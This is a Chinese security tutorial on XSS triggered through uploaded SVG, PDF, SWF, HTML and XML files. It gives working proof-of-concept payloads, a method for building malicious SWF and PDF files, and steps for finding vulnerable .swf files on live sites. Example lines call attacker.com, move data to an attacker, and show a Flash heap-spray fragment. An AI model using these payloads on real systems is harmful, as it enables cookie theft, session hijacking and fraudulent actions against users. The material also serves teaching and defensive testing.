> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5NjUxOTM3Mg==&mid=2247489666&idx=1&sn=001e09686a0787bdd7f588a9614702b6

#  XSS之文件类型触发型XSS  
原创 一个努力的学渣  一个努力的学渣   2025-07-06 15:09  
  
免责声明  
  
本文只做学术研究使用，不可对真实未授权网站使用，如若非法他用，与平台和本文作者无关，需自行负责！  
## SVG型XSS  
- SVG（Scalable Vector Graphics，可缩放矢量图形）是一种基于XML的矢量图形格式，广泛用于网页设计和数据可视化。由于SVG文件支持内嵌JavaScript代码，因此如果处理不当，可能会引发XSS（跨站脚本）攻击  
  
- 攻击原理：  
SVG文件可以通过 <script> 标签直接嵌入JavaScript代码。当浏览器加载SVG文件时，这些代码可能会被执行，从而导致XSS攻击  
（  
SVG（可缩放矢量图形）文件本质上是XML文档）  
  
- 触发方式：  
  
- 直接加载SVG文件：如果SVG文件被直接加载到浏览器中（例如通过 <img> 标签或直接在浏览器中打开SVG文件），嵌入的脚本可能会被执行  
  
- 通过HTML标签加载：如果SVG文件被嵌入到HTML页面中（例如通过 <object> 或 <embed> 标签），嵌入的脚本也可能会被执行  
  
- 利用场景：  
  
- 用户头像上传：  
  
- 允许上传SVG作为头像  
  
- 当其他用户查看资料时执行恶意脚本  
  
- 文件共享服务：  
  
- 上传恶意SVG文件  
  
- 当用户预览文件时触发攻击  
  
- 图标/图标库：  
  
- 注入恶意代码到SVG图标中  
  
- 当网站使用该图标时触发攻击  
  
- CMS模板：  
  
- 在SVG模板中注入恶意代码  
  
- 影响所有使用该模板的页面  
  

```
**************直接脚本注入**************
<svg xmlns=&#34;http://www.w3.org/2000/svg&#34; version=&#34;1.1&#34;>
<circle cx=&#34;100&#34; cy=&#34;50&#34; r=&#34;40&#34; stroke=&#34;black&#34; stroke-width=&#34;2&#34; fill=&#34;red&#34;/>
<script>alert(1)</script>
</svg>
**************直接脚本注入**************
**************事件处理程序触发**************
<svg xmlns=&#34;http://www.w3.org/2000/svg&#34; onload=&#34;alert(document.domain)&#34;>
  <rect width=&#34;100&#34; height=&#34;100&#34; fill=&#34;blue&#34;/>
</svg>
**************外部资源引用**************
<svg xmlns=&#34;http://www.w3.org/2000/svg&#34;>
  <image 
    href=&#34;non-existent-image.jpg&#34; 
    onerror=&#34;alert('XSS via onerror!')&#34;
    width=&#34;100%&#34;
    height=&#34;100%&#34;
  />
</svg>
**************外部资源引用**************
```

  
实操：  
  
比如目标网站允许上传svg格式文件，之后制作一个xss.svg格式的文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaFQRjeGicnkOFfPh8NBib3dMCfF55UqiaR1rfOMepvbaIbOJNvu5RGarsg/640?wx_fmt=png&from=appmsg "")  
  
把xss.svg格式的文件上传到目标系统中，打开后弹窗  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia9mH0LqfZs7rhZUtpOjKReHRGqCvEksTMhK3oDW03eUxTmcicvJaJFGw/640?wx_fmt=png&from=appmsg "")  
## PDF型XSS  
- PDF型XSS是一种利用PDF文档内嵌JavaScript功能在受害者浏览器环境中执行恶意脚本的攻击  
  
- 触发场景：  
  
- **直接渲染漏洞**  
：浏览器内置PDF解析器（如Chrome）未过滤脚本标签，导致嵌入的  
<script>  
被执行  
  
- **外部资源引用**  
：通过  
/EmbeddedFile  
引用外部恶意JS，或篡改PDF内嵌资源（如字体、图片）  
  
- **表单与注释字段注入**  
：PDF表单字段（如表单提交按钮）可绑定恶意JS事件  
  
- 利用场景：  
  
- 文件上传+在线预览场景（最常见）：  
攻击者将恶意PDF上传至支持在线预览功能的网站（如论坛、文档共享平台、企业内网系统）→ 用户访问该PDF预览页 → 内嵌JS在浏览器PDF渲染环境中执行  
  
- 技术依赖：  
  
- 网站使用浏览器内置渲染器（如Chrome PDFium、PDF.js未禁用JS）  
  
- PDF包含app.alert()等Adobe JS API调用（例如通过PyPDF2注入output_pdf.add_js("app.alert('XSS');")）  
  
- 风险后果：  
窃取当前域名Cookie、劫持会话、钓鱼跳转（如伪造登录页）  
  
- PDF嵌入网页攻击：  
恶意PDF通过<object>或<iframe>嵌入第三方网页（例如：<object data="malicious.pdf" type="application/pdf">）→ 用户访问该网页 → PDF内JS以宿主域名权限执行  
  
- 技术依赖：  
  
- 网站允许用户控制嵌入内容（如自定义页面模块）  
  
- 未对PDF来源做同源策略隔离  
  
- 风险后果：  
绕过CSP限制，直接操作宿主页面DOM（例如篡改页面内容、窃取表单数据）  
  
- 钓鱼邮件+附件预览：  
攻击者发送含恶意PDF附件的钓鱼邮件 → 用户使用邮件客户端（如Outlook Web）或Web邮箱的“附件预览”功能打开PDF → JS自动执行  
  
- 技术依赖：  
  
- 邮件系统启用PDF预览且使用易受攻击的渲染引擎（如旧版Adobe插件）  
  
- 用户未下载至本地用独立阅读器打开  
  
- 风险后果：  
窃取邮箱凭证、传播横向钓鱼、触发后续漏洞利用链（如结合RCE漏洞）  
  
- 云存储/网盘服务漏洞：  
用户将恶意PDF上传至云盘（如Google Drive、企业私有云）→ 使用服务的“在线预览”功能 → JS在云服务域名下执行  
  
- 技术依赖：  
  
- 云服务未清洗PDF中的JS动作（如未移除/OpenAction、/AA字典）  
  
- 预览服务使用浏览器内核渲染  
  
- 风险后果：  
以云服务用户身份发起API请求（如读取私有文件列表）、窃取OAuth令牌  
  
- 结合CSRF的复合攻击：  
恶意PDF中嵌入JS发起跨域请求（如fetch('https://bank.com/transfer?to=attacker&amount=10000')） → 用户预览PDF时自动触发转账操作  
  
- 技术依赖：  
  
- 目标接口未校验CSRF Token   
  
- 用户会话处于登录状态  
  
- 风险后果：  
模拟用户执行敏感操作（转账、改密、添加管理员），造成业务逻辑型漏洞  
  
实操：  
  
这里使用的是  
迅捷  
PDF  
编辑器试用版  
  
1  
、创建  
PDF  
，加入动作  
JS  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaickJgo2sFvE7k9ApFABH3Jiam4QkFBibujrMQm6XT556ibSXRB6fSGvPJA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iamgab05nn0p5jUCnuNvVibmVFj9jpTsNCOGDzo2icFgoDNLibDbXLXXf6g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iadfwuEjticfMAfSoiboRkOGsLpxYQTpVv55kG1R1fZTFt9nnXzKVQTG7g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iatSs1b6IZoYxOJNum4MYXX7C7eiaZ3HUh1cEz7z33c7PcYIqj85kJiaGQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaT4MZySDB9kIfnSCyUJSYWNpNt5yibZcAOWyryPz0mvUdBNG4KOty79A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaf5CaeX7dREEicLRKI4ldCxQadE9Nmw7UWLI8JpNibSZ5xpJWRO9cia7qw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia9LWicibdvjnCM2K85Osa85ZzrYMMWeNfQwfQWk7Pp4HClNVwg2b4eiajQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaaCMOmsLL1FFVaibLY4HWb862pqmaWFq71FzibbWtfDmpXBO1rthkGd4w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iadaLRHzT6eTx1JQfTRMhwm6qo12IibJy21bXewtJt2mynqCuia4y6YajQ/640?wx_fmt=png&from=appmsg "")  
  
存在限制：  
- PDF工具直接打开：可能不会执行Javascript代码(部分PDF工具可能会执行Javascript代码，如Adobe Acrobat软件就会执行Javascript代码)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iacarzTaDOFJaCUXH5TCicqebnPEAC9OWBldibxmtnpsqmc727xIDGVutQ/640?wx_fmt=png&from=appmsg "")  
- 浏览器直接打开：会执行Javascript代码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iacn3DLLH4BBkreOqQAKM0f1X5vaksRzIJmS0cw68ibogv8a6KZ189vdQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia8IPJAa9HOgWMUwVozqODnTy8fNPeP3npMoEu7WmwjNYxhNSmO4plAg/640?wx_fmt=png&from=appmsg "")  
  
2  
、通过文件上传获取直链（就是把文件上传到目标服务器）  
  
3  
、直链地址访问后被触发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iagVfGY4ycPzrBeUpBPMEM8rusCQnLK1mACbCPtQY7QcgseAXTwjYAEw/640?wx_fmt=png&from=appmsg "")  
## SWF型XSS  
- SWF型XSS（Flash XSS）是一种利用Adobe Flash文件（.swf）实现跨站脚本攻击的安全漏洞，攻击者通过注入恶意脚本操控浏览器行为  
  
  
- 常见的可触发xss的危险函数：  
  
- 高风险函数（直接执行JS）：  
  
- ExternalInterface.call()：  
  
- 功能：ActionScript与JavaScript通信的核心接口，用于调用网页中的JS函数  
  
- 危险性：  
若第一个参数（JS函数名）或参数值未过滤，攻击者可注入任意JS代码（如ExternalInterface.call("eval", "alert(document.cookie)")）  
  
- getURL()：  
  
- 功能：跳转至指定URL或执行JS伪协议（如javascript:）  
  
- 危险性：  
直接执行javascript:协议内容（如getURL("javascript:alert(document.domain)")），绕过同源策略  
  
- navigateToURL()：  
  
- 功能：  
通过URLRequest对象实现页面跳转或JS执行  
  
- 危险性：  
类似getURL，但支持更复杂的请求。若未校验URL协议，可执行恶意JS  
  
- 中风险函数（间接触发XSS）：  
  
- loadVariables()：  
  
- 功能：从外部源（如URL参数、flashvars）加载数据并解析为ActionScript变量  
  
- 危险性：  
若输入未过滤，攻击者通过flashvars注入恶意字符串（如param=<img src=x onerror=alert(1)>），后续拼接至HTML或JS时触发XSS  
  
- htmlText（TextField属性）：  
  
- 功能：渲染HTML格式文本到Flash文本框  
  
- 危险性：  
  
若内容包含未编码的HTML标签或JS事件（如<a href="javascript:alert(1)">click</a>），解析时执行恶意脚本  
  
  
- ASfunction:伪协议：  
  
- 功能：  
在Flash文本中触发ActionScript函数  
  
- 危险性：结合htmlText可构造点击事件执行危险操作（如<a href="ASfunction:alert,1">XSS</a>）  
  
- 底层函数（组合利用触发XSS）：  
  
- Loader.load()：  
  
- 功能：动态加载子SWF模块  
  
- 危险性：加载恶意子SWF绕过主文件安全校验，子模块调用ExternalInterface.call()触发XSS  
  
- URLLoader.load()：  
  
- 功能：加载外部数据（如XML、文本）  
  
- 危险性：配合宽松crossdomain.xml（如<allow-access-from domain="*"/>），窃取跨域数据并通过ExternalInterface外传  
  
- SharedObject.getLocal()：  
  
- 功能：读写本地共享对象（LSO，类似Cookie）  
  
- 危险性：存储污染数据（如恶意JS字符串），后续被读取并注入DOM触发XSS  
  
- loadMovie()：  
  
- 功能：在 ActionScript 中，loadMovie 函数用于加载一个外部 SWF 文件到当前 Flash 文件中  
  
- 危险性：如果攻击者可以控制加载的 SWF 文件路径，他们可以上传或引用包含恶意代码的 SWF 文件，从而在目标页面中执行恶意脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iafWteaqQVyVzqVY2fTqurGEniaNs0fAV2iac6Wq8j4LiagichUp37qVMmGQ/640?wx_fmt=png&from=appmsg "")  
- 利用场景：  
  
- 用户上传+在线播放场景（最常见）：  
  
- 攻击路径：  
  
- 论坛/博客平台允许用户上传SWF文件 → 攻击者上传含ExternalInterface.call("eval", "恶意JS")的SWF  
  
- 其他用户访问该页面自动触发XSS  
  
- 技术依赖：  
  

```
// 恶意SWF代码片段
if (ExternalInterface.available) {
  ExternalInterface.call(&#34;eval&#34;, &#34;alert(document.cookie)&#34;);
}
```

- 钓鱼邮件附件攻击：  
  
- 攻击路径：  
攻击者发送钓鱼邮件携带恶意SWF附件 → 用户使用邮件客户端预览功能打开 → 触发XSS  
  
- 技术特点：  
  
- 利用Outlook Web等客户端预览机制执行SWF内嵌脚本  
  
- 结合社会工程（如伪装为“订单确认.swf”）  
  
- 危害：  
窃取邮箱凭证、获取用户通讯录  
  
- 恶意广告植入（Malvertising）：  
  
- 攻击路径：  
  
- 攻击者购买广告位注入恶意SWF代码  
  

```
<object data=&#34;//attacker.com/ads/banner.swf?param=javascript:alert(1)&#34;>  
```

- 用户访问含该广告的页面 → SWF解析param参数触发XSS  
  
- 技术依赖：广告平台未对SWF的flashvars参数做安全审核  
  
- 结合CSRF的复合攻击：  
  
- 攻击路径：  
  
- 恶意SWF通过URLLoader读取宽松跨域策略的接口数据  
  
- 使用ExternalInterface将窃取的数据外传  
  

```
// 跨域窃取数据示例
var loader:URLLoader = new URLLoader();
loader.load(new URLRequest(&#34;https://bank.com/userinfo&#34;));
loader.addEventListener(Event.COMPLETE, (e:Event) => {
  var data:String = e.target.data;
  ExternalInterface.call(&#34;postToAttacker&#34;, data); // 外传至攻击者服务器
});
```

- 依赖条件：  
目标站点存在错误crossdomain.xml配置  
  

```
<cross-domain-policy>
  <allow-access-from domain=&#34;*&#34;/> <!-- 致命错误! -->
</cross-domain-policy>
```

- 企业内网渗透：  
  
- 攻击路径：  
  
- 攻击者构造SWF文件利用内网系统信任关系  
  
- 通过SharedObject.getLocal()读取本地缓存敏感数据  
  
- 注入恶意JS扫描内网资源  
  

```
// 内网扫描示例
ExternalInterface.call(
  &#34;fetch('http://192.168.1.1/admin', {credentials: 'include'})&#34;
  .then(res => res.text())
  .then(data => { /* 外传数据 */ })
);
```

- 典型目标：  
OA系统、旧版ERP等未更新Flash策略的内部应用  
  
- 浏览器插件漏洞利用：  
  
- 攻击路径：  
  
- 利用Flash插件漏洞（如CVE-2015-5119）绕过沙箱  
  
- 执行系统级恶意代码  
  

```
// 经典漏洞利用链（Heap Spray）
var shellcode:ByteArray = new ByteArray();
shellcode.writeBytes(生成恶意字节码);
var exploit:Vector.<uint> = new Vector.<uint>(0x1000);
for (var i:int = 0; i < exploit.length; i++) {
  exploit[i] = 0x0c0c0c0c; // 堆喷占位
}
```

- 影响范围：  
未更新补丁的Adobe Flash Player < 18.0.0.324  
  
安装所需工具：  
  
安装Adobe Flash Professional CS6：  
  
Adobe Flash Professional CS6 下载：  
http://www.downza.cn/soft/27510.html  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iarSfoVyB58Bknq0ibPR2AUDoGEMVxw2aXhe4d587apCPo2D4sQyeBI5w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaLcIMG9VQP86JDqpaRp8gWv4YfpqMbGuJ7mlwcTI2icKNS3ibWgMxLlIg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ialkGEU5nBCrIR2rXbASUzvYoPkicCTNksT0xL3ONreIG29YVHic6czP3Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaiam3B9IAVGrofxDTwGLjuLEvYwdJgiaicTPGAicNNfEPDLZnbeSJicukHiaQ/640?wx_fmt=png&from=appmsg "")  
  
以管理员身份运行就可以正常打开了  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iahYOOXvQ18mN5A7Xnek0CGhaiaV7j2nV4kTICzWuXPSwXy0CJLgolWicg/640?wx_fmt=png&from=appmsg "")  
  
制作swf  
-  
xss文件：  
  
1  
、新建swf文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaDfYW64q6PwQQbC9wS2M0l1vWzP1D883BcrYFqDkdbrGQuuVQamyA2g/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaKHl8AwIsEFQMYbl7elkrMXOJMX1uWw76BSIyqHbgnIze5hIA7t6rPA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ianMYHtSiaibowaalOtQDciaJJMwEuP1KGNV0WeicyMX7TbggprTOQicLKeibQ/640?wx_fmt=png&from=appmsg "")  
  
2  
、  
F9  
进入代码区域  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaT2fa6KfNU71TZrzEBfkjQHECeA2sVsRqylLmpDABvibViccpxsqjPD9Q/640?wx_fmt=png&from=appmsg "")  
  
3  
、属性发布设置解析  

```
//取m参数
var m=_root.m;
//调用html中Javascript中的m参数值
flash.external.ExternalInterface.call(m);
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iabCvnNlibyu2mw8Xq7cr2YL5LsL06u4wkePkCxmXfX7BtmaFhialBaFiag/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaMppoFbibzOaib3gSH5D0A5CnKibbj5GsB1jRU7wUPQtVYfXxSkwWJNFEA/640?wx_fmt=png&from=appmsg "")  
  
.swf运行需要安装flag中心工具：  
https://www.flash.cn/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia8XAmCrEPeTAiaFpbJBicd08df8z7jVmb5BoHGQo2mk51ULFBpiayoUudw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iazCiaHqjJBibRb6eOu1bR4yEc3xcXfCFTIFCwZ4EGO1hDpsLZ2ia4OEarQ/640?wx_fmt=png&from=appmsg "")  
  
触发：  
?  
m  
=  
alert  
(  
/xss/  
)  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaC4qjYmibkLI82VswHwCdA2mC9ib1ia5OrzFKBreJfaZ0p2bvSG8tfT4WA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iambmCK5zYBFrYd857mBD4gQCA1sPcuoMYHmfgFf1EyHTTibjx1CSvngg/640?wx_fmt=png&from=appmsg "")  
  
  
swf反编译工具：  
  
JPEXS  
 Free Flash Decompiler  
  
下载地址：  
https://github.com/jindrapetrik/jpexs-decompiler  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaDB98jDhpfLmva7B1QYibKPBgPtU9dL4XSk28wiaFI8SC0ibQRlfTUI6Ng/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaO91O47ibPcYJC5pU1TmcWaeT52CuTNMNZyxeNHC3jsf41XS3SMYTdYg/640?wx_fmt=png&from=appmsg "")  
  
  
如何寻找.swf漏洞？（  
比如4399小游戏，肯定有  
.swf  
文件  
）  
- 比如使用搜索引擎搜索phpwind（phpwind只是某一个模板，只要是存在.swf文件，都可以去尝试下载-->反编译-->分析代码-->利用）  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaUlIuchO8P37KGZPbdAQ3kLbYUPcZvraJBFPs8UZllKW5vLPsDwQWlg/640?wx_fmt=png&from=appmsg "")  
- 之后尝试输入/images/uploader.swf  
- /images/uploader.swf：爬虫、网站扫描、加载资源里面flash播放时自动抓取的  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RwWtAvWe59qsbFGg8MyDWPe51H90icCicic9Md6etWrrJfTD4FhGCE4ME5uaVY4VGvZLicNNfRBtHNuvQ/640?wx_fmt=png&from=appmsg "")  
  
如何测试swf文件xss安全性：  
- 反编译swf文件  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia9KwmVmiaEQgpAXqZib0aEvb2uoZObpyCGuosxFziaiabXwNVr1bcerqdUg/640?wx_fmt=png&from=appmsg "")  
- 查找触发危险函数  
- 常见的可触发xss的危险函数有：getURL，navigateToURL，ExternalInterface  
.  
call，htmlText，loadMovie等等  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaNsVnFrLYEBUicymEw3MmKsA6Hh3wRu7D9of3OjcKDCFTrZFwD1UiajoA/640?wx_fmt=png&from=appmsg "")  
- 找可控参数访问触发  
- jsobject=alert(1)  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iapt7y8Ke4A6ukqNEuCYm5GkmfibVzGq7R70xLk9xQesDlyo6NnI2RNXw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RwWtAvWe59qsbFGg8MyDWPe6g9XJDiajRpb1kVN44AqdneRTymtFfQyu8g9yXMHTrIoZPdp4kOYMKg/640?wx_fmt=png&from=appmsg "")  
  
总结：  
- 上传swf文件可以做xss漏洞  
- 找到目标上存在的swf进行反编译后找xss漏洞  
## HTML型XSS  
- HTML型XSS（跨站脚本攻击）是最常见且危险的Web安全漏洞之一，攻击者通过注入恶意脚本到HTML文档中，在用户浏览器执行这些脚本，从而窃取信息或执行未授权操作  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3ia1rgmTpq6c2VVCJwDgicj9iaWWU4HaNK4QP5TePHia7F2Y3AVZhb2AOrxg/640?wx_fmt=png&from=appmsg "")  
  
  
简单的说：就是单纯在  
HTML  
代码中写  
XSS  
代码即可  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaC1peccUMAEABvx3FXyfh8VOwLMoWDyVpEs88he4PnIg6wdnSNgGK2g/640?wx_fmt=png&from=appmsg "")  
## 其他：XML格式等  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iarOhjXq5XgnhQkUR4xNp1rRaAGHOItCKEgntxsxuSbzz9DktMcbUFGQ/640?wx_fmt=png&from=appmsg "")  
- XML型XSS是一种特殊类型的跨站脚本攻击，利用XML文档解析特性执行恶意脚本。尽管不如HTML型XSS常见，但在API、Web服务和数据驱动应用中危害严重  
  

```
**************利用XHTML命名空间**************
<?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?>
<xhtml:html xmlns:xhtml=&#34;http://www.w3.org/1999/xhtml&#34;>
    <xhtml:script>
        alert(&#34;xss&#34;);
    </xhtml:script>
</xhtml:html>
**************利用XHTML命名空间**************
**************利用script标签的namespaceuri**************
<html>
<head></head>
<body>
    <prefix:script xmlns:prefix=&#34;http://www.w3.org/1999/xhtml&#34;>
        alert(&#34;xss&#34;);
    </prefix:script>
</body>
</html>
**************利用script标签的namespaceuri**************
**************利用svg文件**************
<?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?>
<!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;>
<svg version=&#34;1.1&#34; baseprofile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;>
    <polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/>
    <script type=&#34;text/javascript&#34;>
        alert(&#34;xss&#34;);
    </script>
</svg>
**************利用svg文件**************
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaXFCFakRBvsCj8uO6ViaVn6VyyLdyvkibjCPgW9iaoEiaVBaa17nmibYDG6Q/640?wx_fmt=png&from=appmsg "")  
  
  
总结  
- 文件上传类XSS挖掘：从安全文件上传到  
XSS  
的转换（红队玩法还可以配合钓鱼）  
  
- 当支持HTML文件上传时，优先使用HTML型XSS，我们不能本末倒置，学习了高级技巧，却忘记了最基础的东西  
  
- 利用文件上传获取文件访问地址，访问触发（浏览器格式解析问题会导致失效）  
  
- 文件上传XSS的核心在于信任链的断裂。最有效的攻击往往发生在安全措施的"间隙"中：  
  
- 当安全团队专注于阻止HTML上传时，利用SVG的"合法图片"身份突破  
  
- 当防御者关注存储安全时，利用解析器特性触发漏洞  
  
![](https://mmbiz.qpic.cn/mmbiz_png/BqBKZfLY4RxXDqqSWRxn2t9jwy7MQb3iaicVFSxib71mR4yeYAMNA68WgMrdP0zoo7AalBkPI7wAnIgjSJ7On6RUA/640?wx_fmt=png&from=appmsg "")  
  
